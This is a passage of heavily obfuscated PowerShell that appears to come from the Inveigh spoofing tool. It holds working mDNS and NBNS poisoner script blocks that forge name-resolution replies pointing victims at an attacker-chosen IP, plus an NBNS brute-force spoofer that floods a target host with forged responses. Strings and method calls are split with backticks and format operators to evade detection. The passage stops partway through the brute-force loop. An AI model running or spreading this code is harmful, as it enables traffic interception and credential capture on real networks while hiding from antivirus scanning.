                    ${M`dn`S_resP`onSE_meSS`AGe} = ('- '+"$mDNS_query_string "+'i'+'s '+'on'+' '+'ig'+'n'+'ore '+'l'+'ist')
                }
                elseif(${s`pOO`FERI`PSrEP`lY} -and ${spOoFEr`iPsr`ep`lY} -notcontains ${sOurC`E`_iP})
                {
                    ${mdNS_`REsP`On`Se`_mesSage} = ('- '+"$source_IP "+'i'+'s '+'no'+'t '+'on'+' '+'re'+'pl'+'y '+'lis'+'t')
                }
                elseif(${sPOofERIpS`I`gN`O`Re} -and ${s`POOFeri`PSigN`ore} -contains ${s`O`Urce_IP})
                {
                    ${MDNs`_`RESPoN`S`e_`Mes`sagE} = ('- '+"$source_IP "+'is'+' '+'o'+'n '+'ign'+'ore '+'li'+'st')
                }
                elseif(${i`N`VeIGh}."ip_ca`Pt`URE_L`IsT" -contains ${SOur`C`e_iP})
                {
                    ${mDns_resPO`NS`e_`M`EsS`AGe} = ('- '+'p'+'revious'+' '+'cap'+'tu'+'re '+'f'+'rom '+"$source_IP")
                }
                else
                {
                    ${MD`NS_`R`EsPONs`E_mESSAGE} = ("{2}{4}{1}{5}{0}{3}" -f'r','ng wen','- somet','ong','hi','t w')
                }
                                
            }
        
            if(${M`Dn`S_REQ`U`Es`T_dAta})                   
            {
                ${in`VeI`GH}."COnsoL`e`_q`UEue".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') - mDNS(QU) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))

                if(${iN`VE`iGH}."fILE`_OuTP`Ut")
                {
                    ${I`NvE`IGh}."lO`g_`FiLe`_`QuEuE".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - mDNS(QU) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))
                }

                if(${INVE`I`Gh}."lOG`_ouT`puT")
                {
                    ${i`N`VeiGh}."l`oG".("{0}{1}" -f'A','dd').Invoke(("$(Get-Date -format 's') - mDNS(QU) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))
                }

            }

            ${Md`NS_ReQU`e`ST_da`Ta} = ""
        }
        elseif(  ( &('Gi')  vARiabLE:CyJ6E1).VALue::("{0}{1}{2}"-f'T','o','String').Invoke(${md`N`S_REQU`ESt_D`Ata}) -like ("{1}{2}{5}{0}{3}{4}" -f'F-','*','-05-6C-','63-','61-6C-00-00-01-00-01-*','6'))
        {
            ${MDnS_R`E`spOnSE_`Pa`c`KET} = ${MDns_Re`qu`e`st`_d`Ata}[0,1] +
                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                    ${mdNs_r`equest`_`dA`Ta}[12..(${mDNs_R`eQ`UEs`T_dATA}[12] + 12)] +
                                    0x05,0x6c,0x6f,0x63,0x61,0x6c,0x00 +
                                    0x00,0x01,0x00,0x01 +
                                    ${mdN`S_Tt`l_B`Ytes} +
                                    0x00,0x04 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]${sPoO`F`erip})).("{2}{4}{0}{3}{1}"-f 'sB','es','GetAddr','yt','es').Invoke()
                        
            ${M`DNs_Q`UErY_sTR`i`Ng} = &("{2}{0}{1}" -f'taToSt','ring','Da') 13 ${M`Dn`s_`ReqUES`T_DaTa}[12] ${M`dNs_ReQ`UESt_D`Ata}
            ${MDNs`_`QUE`R`y`_STrInG_fU`LL} = ${mdns_QuEr`Y`_St`Ring} + ("{1}{0}" -f'al','.loc')   
            ${sOu`RC`E_`ip} = ${Md`Ns_l`I`sTEnEr_ENDPO`I`Nt}."aD`D`REss"."i`p`A`D`dReSStoST`Ring"
                
            if(!${INSP`E`Ct} -and (${md`Ns_`REQ`Ue`S`T_dAta} -and ${Md`Ns`_lI`S`TENer`_e`NDPo`iNT}."ad`dRESs"."I`Pa`dDRESStostrI`NG" -ne ("{1}{2}{0}" -f'.0','0.0','.0')) -and (!${s`poO`FerhO`s`TS`REPlY} -or ${Sp`oOferHos`TsRE`ply} -contains ${mdNs_q`UE`R`Y_ST`RI`NG}) -and (
            !${sPOO`Fe`Rh`O`sts`igNO`RE} -or ${sp`o`oFErHoS`TsiGnOre} -notcontains ${mdNs`_Qu`E`Ry_sTRiNg}) -and (!${s`poo`FeriPSre`Ply} -or ${S`PO`ofERIPsR`epLY} -contains ${sourcE`_`Ip}) -and (!${SPo`o`FERI`psi`GNoRe} -or ${Spoo`F`ER`ipSigNoRe} -notcontains ${sOU`R`cE_IP}) -and (
            ${M`Dn`STYpes} -contains 'QM') -and (${IN`VEI`gh}."Sp`OofeR_`RepE`At" -or ${i`NVeI`Gh}."iP_captu`Re_l`I`sT" -notcontains ${sO`UrcE`_IP}))
            {
                ${mdN`S`_destINATiON_E`N`dpOinT} = &("{0}{1}{2}" -f'Ne','w-Obj','ect') ("{3}{1}{2}{0}" -f 'int','p','o','Net.IPEnd')([IPAddress]("{0}{2}{1}" -f '224.0.0.','51','2'),5353)
                ${M`DNs_U`d`p_cl`ieNT}.("{0}{1}{2}"-f'C','onnec','t').Invoke(${M`Dn`s`_dEstiNAtIO`N_EN`dp`O`INt})
                ${mdNS`_`U`Dp_cli`Ent}.("{1}{0}"-f'd','Sen').Invoke(${mDnS_re`SPOnSe_`p`ACkeT},${MDN`S_res`p`oNse_`p`AckeT}."lEng`Th")
                ${M`dns`_u`DP_cLieNt}.("{1}{0}" -f 'se','Clo').Invoke()
                ${mDn`s_UDp`_`cl`iEnT} = &("{2}{0}{1}" -f 'je','ct','new-Ob') ("{3}{4}{2}{0}{6}{5}{1}"-f'.Soc','dpClient','et','Sys','tem.N','U','kets.') 5353
                ${mDnS_MULti`ca`S`T_g`RouP} = [IPAddress]("{1}{2}{0}"-f '251','224.0','.0.')
                ${M`dn`s_Udp_cl`IENt}.("{1}{2}{0}{3}{4}" -f 'inMulticastG','J','o','ro','up').Invoke(${MdNS_mU`LtiCA`S`T`_`gRoup})
                ${Mdns`_U`DP`_C`LiEnt}."C`L`ienT"."r`E`ceivet`imeOUT" = 5000
                ${mDNs`_`R`EspO`NSE_MEss`A`ge} = ("{1}{4}{2}{3}{0}" -f 'nt','- r','sp','onse se','e')
            }
            else
            {

                if(${in`s`PeCT})
                {
                    ${mdN`s_RES`P`o`NSe`_Mes`saGe} = ("{3}{1}{2}{4}{0}"-f 'nly','inspect',' ','- ','o')
                }
                elseif(${mdN`ST`YP`ES} -notcontains 'QM')
                {
                    ${mD`Ns_`ReSPonSe_`M`EsS`A`ge} = ("{3}{2}{5}{4}{1}{0}" -f'ype','S t',' ','- disabled','DN','m')
                }
                elseif(${SpoofEr`hoS`TsreP`lY} -and ${sPooFE`Rho`S`TsREPly} -notcontains ${mDnS_Qu`E`RY_Str`INg})
                {
                    ${m`DN`s`_r`ESpON`se_`meSSAgE} = ('- '+"$mDNS_query_string "+'i'+'s '+'not'+' '+'on'+' '+'rep'+'ly '+'li'+'st')
                }
                elseif(${s`poOfe`R`HOS`TsiGnore} -and ${sP`O`of`eRH`OsTsIg`NORe} -contains ${mDNS`_`q`UERY_STriNG})
                {
                    ${m`DnS_Res`pON`SE`_meSSage} = ('- '+"$mDNS_query_string "+'is'+' '+'o'+'n '+'i'+'gnor'+'e '+'lis'+'t')
                }
                elseif(${Spo`O`F`ERIPSr`EPLy} -and ${SpoO`F`eRIP`sre`pLy} -notcontains ${so`UrcE_`ip})
                {
                    ${MDns_`Re`s`PONSE`_M`Essa`gE} = ('- '+"$source_IP "+'is'+' '+'no'+'t '+'o'+'n '+'re'+'ply '+'li'+'st')
                }
                elseif(${Spo`ofERIpsi`Gn`Ore} -and ${spOOfERi`Psig`NO`RE} -contains ${sou`R`ce_iP})
                {
                    ${mDN`S_rESpon`sE_`me`sS`A`gE} = ('- '+"$source_IP "+'is'+' '+'o'+'n '+'i'+'gnor'+'e '+'l'+'ist')
                }
                elseif(${INV`E`IGh}."ip`_caPtUrE_`Li`ST" -contains ${SouR`Ce`_IP})
                {
                    ${mdnS_reSPOnS`E`_MES`s`AGE} = ('- '+'p'+'r'+'ev'+'ious '+'cap'+'t'+'ure '+'f'+'rom '+"$source_IP")
                }
                else
                {
                    ${M`dnS_reS`POnS`e`_`m`eSsAge} = ("{1}{2}{3}{0}{5}{4}{6}"-f'w','- somet','hing',' ','t w','en','rong')
                }

            }

            if(${mDn`s_ReQ`UEsT`_`dA`Ta})                   
            {
                ${i`NVeI`Gh}."CONsO`Le`_qUeuE".("{0}{1}" -f'A','dd').Invoke(("$(Get-Date -format 's') - mDNS(QM) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))

                if(${i`N`VeigH}."fIl`E_OU`TPut")
                {
                    ${I`NvE`igh}."lOg_File_`qUe`UE".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - mDNS(QM) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))
                }

                if(${I`NvEIgH}."LoG`_OUT`P`Ut")
                {
                    ${I`N`Veigh}."L`Og".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - mDNS(QM) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))
                }

            }

            ${m`dns_R`eqU`eS`T`_DatA} = ""
        }

    }

    ${md`Ns`_Udp_c`l`ieNt}.("{1}{0}"-f'lose','C').Invoke()
 }


${nBNS`_SP`oOfE`R`_s`criPtBlOCk} = 
{
    param (${InSP`e`cT},${nb`NS_REsPoNse_`m`Es`SagE},${S`POofeR`Ip},${N`BNS`Types},${SPoOF`Erh`o`sTsR`Eply},${sP`oOf`ERHOs`TSigNOre},${spOOfE`Rip`SReP`Ly},${Sp`oo`Ferip`SIGn`oRe},${nBn`ST`Tl})

    ${N`BNS`_RunNI`Ng} = ${tr`UE}
    ${nbN`S_LIsteNEr`_eNDpo`InT} = &("{2}{1}{0}"-f'bject','O','New-') ("{2}{0}{3}{1}{4}{5}"-f'ystem.Ne','IPE','S','t.','n','dPoint') ( (  &('GI') ('v'+'A'+'rIABL'+'E:j91GQ'+'k')  ).VAluE::"b`RoadCast",137)

    try
    {
        ${nB`Ns_`UDP`_C`LiENT} = &("{2}{1}{0}" -f 'ject','ew-Ob','N') ("{2}{6}{1}{3}{5}{0}{4}" -f 's.Udp','.Soc','System.','ke','Client','t','Net') 137
    }
    catch
    {
        ${INvE`IGH}."coNSO`Le`_QU`eUe".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - Error starting NBNS spoofer "))
        ${NbN`s_RUN`NiNG} = ${fa`L`Se}

        if(${inVE`i`Gh}."fIl`E`_ouTPuT")
        {
            ${I`N`VeiGh}."Log_fiLe_q`U`Eue".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - Error starting NBNS spoofer "))
        }

        if(${InvE`I`Gh}."L`OG`_OUTPUt")
        {
            ${IN`VE`igH}."l`oG".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - Error starting NBNS spoofer "))
        }

    }

    ${nB`NS_ud`p_`ClIenT}."Cli`E`Nt"."R`eCE`I`VetiMEo`UT" = 5000
    ${Nb`NS_Ttl_`B`YtES} =   $Cyj6E1::("{2}{1}{0}" -f'es','yt','GetB').Invoke(${N`BN`sttl})
     (&("{1}{0}"-f'r','DI')  vArIABle:3xp).vAlUE::("{1}{0}"-f 'everse','R').Invoke(${nb`Ns`_tTl_bY`T`Es})

    while(${invE`IGh}."RuN`Ni`NG" -and ${NbNS_RuN`N`iNG})
    {
        
        try
        {
            ${NBns_requ`e`St_D`ATa} = ${n`BnS_u`dP`_c`LiEnT}."REC`EI`Ve"([Ref]${Nb`N`S_LI`sTEn`e`R_En`DPoInt})
        }
        catch
        {
            ${nB`NS_U`DP`_CLiEnt}.("{1}{0}" -f'e','Clos').Invoke()
            ${Nbns_Ud`p_Cl`Ie`NT} = &("{1}{0}{2}"-f 'bj','New-O','ect') ("{3}{5}{2}{0}{1}{4}" -f'tem.Net.Sockets','.UdpClien','s','S','t','y') 137
            ${n`BnS_`UDP_ClIE`Nt}."Cl`i`ent"."R`E`ce`iVeTIme`oUt" = 5000
        }

        ${iP} = (&("{2}{3}{4}{0}{1}"-f'ec','tion','T','est-','Conn') ("{2}{1}{0}"-f '1','0.0.','127.') -count 1 | &("{3}{0}{2}{1}" -f 'e','t','lect-Objec','S') -ExpandProperty ("{3}{2}{0}{1}"-f'Addr','ess','4','Ipv'))

        if(${n`Bns_RE`q`UeST_dA`TA} -and  (&("{0}{2}{1}" -f 'VA','AbLe','rI')  cyj6e1).vaLUe::"TO`s`TRiNg"(${nbN`S`_r`EquES`T_DatA}[10..11]) -ne ("{1}{0}" -f'0-01','0'))
        {
            ${NbN`s_`TtL`_bytes} =  $CYJ6e1::("{0}{1}" -f'GetBy','tes').Invoke(${N`Bn`Sttl})
             (  &("{1}{0}"-f'i','Gc')  ("vArI"+"AblE"+":3xp") ).valuE::("{1}{0}"-f'erse','Rev').Invoke(${nbNS`_TT`L`_bYteS})

            ${NBnS`_Re`SpONsE_pa`CkeT} = ${NBnS_REq`UEst`_D`A`TA}[0,1] +
                                    0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                                    ${nBNs`_R`e`q`UesT_DaTa}[13..${nBNs_R`e`QUESt_D`AtA}."LenG`TH"] +
                                    ${Nb`N`s_t`Tl_BytEs} +
                                    0x00,0x06,0x00,0x00 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]${SP`O`OFERIP})).("{1}{2}{3}{0}"-f 'ressBytes','Get','A','dd').Invoke() +
                                    0x00,0x00,0x00,0x00

            ${s`OU`RC`e_iP} = ${N`BNs_LiSt`ener_`E`Nd`POinT}."a`ddRESs"."i`Pa`D`dr`EssToSTriNg"
            ${NBnS`_`QuEry_Ty`pe} =  (  &("{2}{1}{0}" -f'le','ariAB','v')  ('cY'+'j6E1')  -valUEONL)::"t`osTR`ing"(${Nb`Ns_reQ`Ues`T_DaTA}[43..44])
                    
            switch (${Nbn`S_q`Ue`Ry_t`yPE})
            {

                ("{0}{1}"-f'41-','41')
                {
                    ${NBns_`que`RY_t`yPe} = "00"
                }

                ("{1}{0}"-f '1-44','4')
                {
                    ${NbNs_qu`e`R`Y_TYpe} = "03"
                }

                ("{0}{1}" -f '43-4','1')
                {
                    ${nbnS`_Q`UeRY`_tyPE} = "20"
                }

                ("{0}{1}"-f '42','-4C')
                {
                    ${nbn`S_qu`ery_`Ty`pE} = "1B"
                }

                ("{0}{1}" -f '42-4','D')
                {
                    ${n`BnS`_Q`UEry_typE} = "1C"
                }

                ("{1}{0}"-f'2-4E','4')
                {
                    ${nbnS_`QUE`RY_`Ty`PE} = "1D"
                }

                ("{0}{1}" -f '42-','4F')
                {
                    ${NbNs`_`Qu`erY_Ty`pe} = "1E"
                }

            }

            ${N`Bns_q`UERy} =   (  &("{0}{2}{3}{1}"-f 'gE','ARIablE','T','-V') cYj6E1 -vAlueOnl)::"TosT`RI`NG"(${N`BN`S_reQ`Uest`_`daTa}[13..(${nbnS`_rEq`U`est`_da`TA}."leng`Th" - 4)])
            ${NbnS`_q`Uery} = ${NBNS_`qU`E`Ry} -replace "-00",""
            ${n`BN`s_que`RY} = ${nB`NS_Q`UERy}.("{0}{1}" -f'S','plit').Invoke("-") | &("{3}{1}{0}{2}" -f'Ob','orEach-','ject','F'){[Char]  (&("{0}{1}{2}"-f'G','ET-I','TeM') VariaBle:IGU7qm).vaLUE::("{1}{0}" -f 't16','ToIn').Invoke(${_},16)}
            ${n`BNS_qUerY`_`stR`iNg`_EnCOdED} = &("{2}{1}{0}"-f'Object','-','New') ("{0}{2}{3}{1}"-f'Sy','ing','s','tem.Str') (${nBns_`qUe`Ry},0,${nB`Ns_q`U`eRY}."lE`NGth")
            ${Nb`N`S_qUERy_stri`NG_`En`COdED} = ${nbnS_`QuErY_S`T`RIng_EN`C`oDED}.("{2}{0}{1}" -f 'stri','ng','Sub').Invoke(0,${NbNS_quE`Ry`_StrIng_`e`Nc`Od`ed}.("{1}{2}{0}" -f 'Of','Ind','ex').Invoke("CA"))
            ${Nb`Ns`_Quer`y_`s`Tri`Ng_S`U`BtraCtEd} = ""
            ${Nbns_q`Ue`RY_St`R`iNg} = ""
            ${n} = 0
                            
            do
            {
                ${nb`NS_qU`ER`Y_`stRIng_sUb} = (([Byte][Char](${n`BnS_`q`UE`Ry_St`RinG_ENCoded}.("{2}{0}{3}{1}"-f'bst','g','Su','rin').Invoke(${n},1))) - 65)
                ${NB`N`S_qUe`R`Y_Str`iNG`_`SuBtract`Ed} += (  (&("{0}{2}{1}{3}" -f 'GE','hild','T-C','Item')  varIabLe:iGU7qM ).vALUE::("{1}{2}{0}" -f 'ng','ToS','tri').Invoke(${NBNS_`qU`eRY`_stRI`NG_sub},16))
                ${N} += 1
            }
            until(${n} -gt (${n`BnS`_q`UeRy_sT`R`IN`G`_EnCODed}."lENG`TH" - 1))
                    
            ${N} = 0
                    
            do
            {
                ${n`BnS_Qu`er`y_sTrIng} += ([Char]( $Igu7QM::("{0}{1}"-f'To','Int16').Invoke(${N`B`N`S_qUEry`_ST`RING`_SubTRaCTed}.("{1}{2}{0}" -f'ing','Sub','str').Invoke(${n},2),16)))
                ${N} += 2
            }
            until(${n} -gt (${Nb`N`S_q`U`Ery_s`TrinG_`SUb`TRaCtEd}."L`engTH" - 1) -or ${nBN`S`_qUERY_St`RinG}."Le`NG`TH" -eq 15)
                                 
            if(!${INSp`Ect} -and (${NB`N`s_`REquest_dAta} -and ${nbn`s_`L`I`STENER`_enD`POint}."ADD`RESS"."i`P`Add`Res`sT`OstRINg" -ne ("{0}{1}{3}{2}"-f'255.2','55.255.','55','2')) -and (!${spO`of`erhOSt`S`RePLy} -or ${S`poO`FERHO`stsrePly} -contains ${N`B`NS`_quEry`_S`TRinG}) -and (
            !${spOO`FERhO`S`TSi`gnORe} -or ${S`POOfEr`hoST`SiGnorE} -notcontains ${NBns_QU`ery_`S`TrINg}) -and (!${sPoOF`er`ip`s`ReplY} -or ${sPo`oFeRI`P`SRePLy} -contains ${sO`URC`e_ip}) -and (!${spOOf`e`RI`P`sigNOre} -or ${s`PoofErI`PSigN`o`Re} -notcontains ${soUr`c`E_iP}) -and (
            ${inv`E`iGH}."SPOof`eR`_Rep`eaT" -or ${i`NvEi`Gh}."Ip_`c`Ap`TU`Re_List" -notcontains ${sOur`c`e_iP}) -and (${NbN`S`TyP`eS} -contains ${NbNs`_quErY_T`Ype}) -and (${sO`URce`_Ip} -ne ${I`p}))
            {
                ${NBns_De`s`T`Inat`iO`N_E`NdP`Oint} = &("{1}{2}{0}" -f'ct','New','-Obje') ("{1}{3}{4}{5}{2}{0}"-f'int','System.N','dpo','et.','I','PEn')(${n`BNs_lIs`T`EN`e`R_EndpOi`NT}."a`DDREss",137)
                ${N`BN`S_UD`p_cl`Ie`Nt}.("{2}{1}{0}"-f 'ect','onn','C').Invoke(${nBN`S_D`ES`TIN`AtIo`N_EndPOINt})
                ${Nb`Ns_uD`P`_`cliENt}.("{1}{0}"-f 'end','S').Invoke(${nb`Ns`_re`s`pOnSE`_pACK`Et},${nBN`s_`ReSP`onSe`_pac`K`ET}."le`NGth")
                ${N`BNs_uDp`_`C`lienT}.("{0}{1}"-f 'Clos','e').Invoke()
                ${nbn`S_UdP_C`Li`eNt} = &("{0}{1}{2}" -f 'N','ew-Ob','ject') ("{5}{1}{4}{6}{2}{0}{3}" -f'dpClien','t','ets.U','t','em.Ne','Sys','t.Sock') 137
                ${nbNS_u`d`P_`cLI`eNt}."Cl`IE`NT"."rEC`e`iVEtim`EoUT" = 5000
                ${nbNS`_`REsp`OnSe`_M`E`Ssage} = ("{0}{3}{2}{1}"-f '- r','ent','onse s','esp')
            }
            else
            {

                if(${iNsP`eCt})
                {
                    ${nbn`s_RespoNs`E`_m`ESSagE} = ("{2}{1}{3}{0}" -f ' only','e','- insp','ct')
                }
                elseif(${NBN`St`Yp`eS} -notcontains ${n`Bns_qUErY`_t`YPe})
                {
                    ${NB`Ns_r`eSpO`Nse_mEssAGe} = ("{0}{1}{2}{3}{4}" -f '- ','disab','led',' ','NBNS type')
                }
                elseif(${spoOfe`RH`osT`srepLy} -and ${sPoOfErHOs`TS`Re`PLY} -notcontains ${nB`NS_qU`ER`Y_ST`R`InG})
                {
                    ${NB`N`S_rEs`P`oNsE_MES`s`Age} = ('- '+"$NBNS_query_string "+'is'+' '+'not'+' '+'on'+' '+'repl'+'y '+'l'+'ist')
                }
                elseif(${SpOOf`E`RHOSTS`i`gno`Re} -and ${s`PoOFErHOS`Ts`IGNorE} -contains ${NBN`S_q`U`ERY_s`T`RinG})
                {
                    ${Nbn`s_`REsPo`NSE_mEsS`AGE} = ('- '+"$NBNS_query_string "+'is'+' '+'o'+'n '+'i'+'gnore '+'lis'+'t')
                }
                elseif(${SpOof`E`R`ipsRE`plY} -and ${Sp`O`OFErIp`srEpLy} -notcontains ${S`OUrcE_`Ip})
                {
                    ${n`BNS`_rES`POnsE_Me`SSAgE} = ('- '+"$source_IP "+'i'+'s '+'not'+' '+'o'+'n '+'r'+'epl'+'y '+'li'+'st')
                }
                elseif(${sP`Oo`FEripSI`GNORE} -and ${sPoOFe`RiPs`igN`ORE} -contains ${s`o`Urce_ip})
                {
                    ${n`B`Ns_rES`PonS`E_m`esSa`Ge} = ('- '+"$source_IP "+'is'+' '+'on'+' '+'ign'+'or'+'e '+'li'+'st')
                }
                elseif(${InV`ei`Gh}."Ip_CaP`T`U`RE_LISt" -contains ${sOurC`e_`Ip})
                {
                    ${Nb`NS_res`PON`S`E_mESs`A`Ge} = ('- '+'pre'+'v'+'ious '+'c'+'apture'+' '+'fr'+'om '+"$source_IP")
                }
                elseif(${SOu`R`cE_ip} -eq ${ip})
                {
                    ${N`BNS_`ReSp`ons`e_me`ssAgE} = ("{3}{1}{0}{2}" -f'l req',' loca','uest','-')
                }
                else
                {
                    ${NbNS_rE`sp`o`NSE`_mEsSAGE} = ("{3}{2}{1}{4}{0}"-f ' wrong','e','something w','- ','nt')
                }
                                    
            }

            if(${nBns_reqU`e`sT_da`Ta})                   
            {
                 ${In`V`Eigh}."CONSo`lE`_Q`UEuE".("{0}{1}" -f'Ad','d').Invoke(("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message "))

                if(${iNVE`I`GH}."fi`lE`_OutPUt")
                {
                    ${inv`EigH}."L`O`g_FIl`E_`QUEUE".("{1}{0}" -f'd','Ad').Invoke(("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message "))
                }

                if(${iNVE`i`gH}."lOg`_`outpuT")
                {
                    ${IN`VE`Igh}."L`og".("{0}{1}" -f 'A','dd').Invoke(("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message "))
                }

            }

            ${nbN`s_re`Qu`est_DatA} = ""
        }

    }

    ${n`BNs_uDp_`C`L`iEnt}.("{1}{0}"-f 'e','Clos').Invoke()
 }


${NbNs_BrUtefor`CE_spOo`FEr_s`C`Ri`ptblO`cK} = 
{
    param (${sp`oo`Fe`RIp},${n`B`N`sBRuTE`F`OrCeHost},${NBNsb`RuTeF`Or`cet`ARGEt},${nbn`s`Bru`TefO`RcePaU`sE},${nbNs`T`TL})
   
    ${NBNsB`RU`T`eForC`EhoST} = ${NBN`sbrUte`FORCE`H`oST}.("{0}{2}{1}"-f 'T','r','oUppe').Invoke()

    ${h`Os`TnAME_`BY`TEs} = 0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,
                        0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x41,0x41,0x00

    ${h`OstNaME_En`CO`DED} =  ( &("{1}{0}" -f 'cI','g')  VARiAbLe:9t2jBy  ).valuE::"ut`F8".("{1}{0}" -f'tBytes','Ge').Invoke(${nBns`BrU`TEf`ORc`EhOst})
    ${h`ostnAm`e`_EnC`ODed} =  (&("{0}{2}{1}" -f'geT-Vari','BlE','a') cYJ6e1  ).VAluE::("{0}{1}{2}" -f 'ToSt','r','ing').Invoke(${H`OSTn`AME_eNcO`deD})
    ${HOs`TnA`Me_ENCo`d`eD} = ${hosTnAmE`_E`N`cOD`Ed}.("{2}{1}{0}"-f 'e','lac','Rep').Invoke("-","")
    ${hoSt`N`A`Me_`ENcODeD} =  ( &('LS')  ('Va'+'riab'+'LE'+':9t2jby') ).VAlUE::"Ut`F8".("{2}{0}{1}" -f'et','Bytes','G').Invoke(${HosTNamE_`eNC`o`d`ed})
    ${nbNs_t`Tl_b`Y`TeS} =   (&("{1}{0}"-f 'iaBle','vAr')  ("C"+"Y"+"J6e1")  ).ValuE::("{0}{1}" -f 'GetByte','s').Invoke(${nb`NSttl})
     (  &("{1}{2}{0}"-f 'BlE','VAR','IA')  ("3X"+"p")  -vaLueO )::("{1}{0}" -f 'e','Revers').Invoke(${nB`N`s_TTl_by`TES})

    for(${i}=0; ${I} -lt ${h`osT`Na`Me`_ENco`deD}."cO`UNT"; ${I}++)
    {

        if(${HoS`TNa`m`E_EnCOd`Ed}[${I}] -gt 64)
        {
            ${HostnaM`e_`BY`TeS}[${i}] = ${hOsTnAm`E_`e`NcO`D`Ed}[${i}] + 10
        }
        else
        {
            ${Ho`st`Na`ME_BYTES}[${I}] = ${ho`S`TNAme`_ENCodEd}[${i}] + 17
        }
    
    }

    ${NbNS`_`RESP`ON`Se_pA`CkeT} = 0x00,0x00,0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                            ${hoS`TNaMe_B`y`TES} +
                            0x00,0x20,0x00,0x01 +
                            ${nb`NS_`TTL_By`Tes} +
                            0x00,0x06,0x00,0x00 +
                            ([System.Net.IPAddress][String]([System.Net.IPAddress]${sPoO`Fer`ip})).("{0}{3}{1}{2}" -f 'GetAdd','e','ssBytes','r').Invoke() +
                            0x00,0x00,0x00,0x00

    ${I`Nv`eIGh}."COns`OLE`_QUEUE".("{1}{0}" -f 'dd','A').Invoke(("$(Get-Date -format 's') - Starting NBNS brute force spoofer to resolve $NBNSBruteForceHost on $NBNSBruteForceTarget "))
    ${NBns_Pa`US`eD} = ${FA`lSe}          
    ${nBn`S_br`U`T`EFo`RCE`_`UdP_CLIE`Nt} = &("{1}{2}{0}" -f 'ct','New-O','bje') ("{5}{2}{6}{3}{0}{1}{4}{7}" -f'.Soc','kets.UdpCl','em','et','i','Syst','.N','ent')(137)
    ${DeSTI`N`ATIon_ip} =  (&("{2}{0}{1}" -f'iT','Em','CHILD') ("variab"+"L"+"e:"+"X"+"pt4Ko")  ).vaLUE::("{1}{0}" -f'rse','Pa').Invoke(${Nbn`sb`RuTefOrc`e`TA`R`gEt})
    ${dESt`Ina`Ti`O`N_pOi`Nt} = &("{0}{2}{1}" -f'New-','ct','Obje') ("{1}{2}{0}{3}"-f 'PEndp','Ne','t.I','oint')(${dE`Stin`A`TI`ON_IP},137)
    ${nBns`_Br`Ut`E`FoRCE_u`DP`_`clI`ENt}.("{0}{1}{2}" -f'Con','n','ect').Invoke(${dE`stI`NatiOn_p`O`i`Nt})

    if(${INVe`i`GH}."Fil`e`_ouT`PUT")
    {
        ${I`NvEIgh}."L`oG_`F`ile_`QUEue".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - Starting NBNS brute force spoofer to resolve $NBNSBruteForceHost on $NBNSBruteForceTarget "))
    }

    if(${IN`VeigH}."lOg_`ouT`p`Ut")
    {
        ${inveI`GH}."l`oG".("{0}{1}"-f'A','dd').Invoke(("$(Get-Date -format 's') - Starting NBNS brute force spoofer to resolve $NBNSBruteForceHost on $NBNSBruteForceTarget "))
    }
       
    while(${IN`V`eIGh}."RUnN`i`Ng")
    {

        :NBNS_spoofer_loop while (!${INVE`iGh}."HOsT`Nam`E_s`poOF" -and ${I`N`VEigH}."RUNN`I`NG")
        {

            if(${NB`N`S_p`AUsed})
            {
                ${INV`eI`gh}."Co`NSOLe_Q`UEue".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - Resuming NBNS brute force spoofer "))
                ${NBN`S_`paus`ed} = ${F`AlSE}

                if(${in`VeIGh}."Fi`LE`_ouTPUT")
                {
                    ${I`Nv`eIgH}."lO`G_FIlE_`qUeUe".("{0}{1}" -f 'A','dd').Invoke(("$(Get-Date -format 's') - Resuming NBNS brute force spoofer "))
                }

                if(${i`Nv`eigh}."log_o`UTP`UT")
                {
                    ${i`NV`Eigh}."L`oG".("{1}{0}" -f 'dd','A').Invoke(("$(Get-Date -format 's') - Resuming NBNS brute force spoofer "))
                }

            }

            for (${i} = 0; ${I} -lt 255; ${i}++)
            {

                for (${J} = 0; ${J} -lt 255; ${J}++)
                {
                    ${nB`N`S`_rE`sPoNS`e_PacKEt}[0] = ${i}
                    ${nBNs`_Res`P`O`NSe_P`ACk`eT}[1] = ${J}                 
                    ${NBNs_`BR`UT`eFo`RcE_uDP`_C`lIEnt}.("{0}{1}"-f 'sen','d').Invoke(${nbnS_rEsPO`N`S`e_`PA`ckEt},${Nb`Ns_Re`spOnse_PACK`et}."l`ength")

                    if(${iNV`ei`Gh}."HOsTnAM`E_`sPOof" -and ${nbnSB`R`Ute`FORCepA`Use})
                    {
                        ${Inv`EiGh}."consOlE_`qu`E`UE".("{0}{1}" -f 'A','dd').Invoke(("$(Get-Date -format 's') - Pausing NBNS brute force spoofer "))
                        ${n`BN`S_`pAUseD} = ${Tr`Ue}
                        break ("{2}{1}{3}{0}{4}{5}"-f 'er','BN','N','S_spoof','_loo','p')

                        if(${i`NVEigh}."f`ilE_OU`TPUT")
                        {
